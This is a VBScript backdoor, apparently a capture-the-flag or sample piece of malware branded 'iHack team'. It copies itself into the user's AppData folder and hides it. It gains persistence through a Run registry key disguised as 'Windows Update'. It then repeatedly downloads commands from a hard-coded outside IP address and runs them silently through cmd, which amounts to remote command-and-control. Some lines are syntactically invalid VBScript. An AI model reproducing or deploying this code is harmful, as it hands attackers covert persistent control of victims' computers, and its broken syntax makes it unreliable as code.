Option Explicit
On Error Resume Next
Const tail = "7866c99c63a26b4886"
Const test = "122.20/"
Set oFileSystem = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
Const close = "}"
Const versionfile = "version.txt"
app_data = WshShell.ExpandEnvironmentStrings("%APPDATA%")
full_install = app_data & "\ihack.vbs"
If Not oFileSystem.FileExists(full_install) Then
        oFileSystem.CopyFile WScript.ScriptFullName, full_install
        WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update", full_install, "REG_SZ"
        Set rs_map = oFileSystem.GetFile(full_install)
        rs_map.Attributes = 2
End If
Const server = "http://139.59." & test & versionfile
done = False
Do Until done
        Set XMLHTTP = CreateObject("MSXML2.XMLHTTP.3.0")
        XMLHTTP.open "GET", server, False
        XMLHTTP.send
        command = XMLHTTP.responseText
        WshShell.Run "cmd /c " & command, 0, True
        MsgBox("Your computer has been compromised by iHack team. You can exit this msgbox in your Task Manager.")
        If InStr(command, "iha") Then
                dim sec = command & tail & close
        Else InStr(command, "EXIT") Then
                done = True
        End If
        If InStr(command, "REMOVE") Then
                WshShell.RegDelete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update"
                Set delete_me = oFileSystem.CreateTextFile(oFileSystem.GetSpecialFolder(2) & "\romcs.bat")
                delete_me.WriteLine("@echo off")
                delete_me.WriteLine("timeout 10")
                delete_me.Close()
                WshShell.Run oFileSystem.GetSpecialFolder(2) & "\romcs.bat"
                done = True
        Else
                WshShell.Run "cmd /c " & command, 0, True
        End If
        WScript.Sleep(15000)
Loop

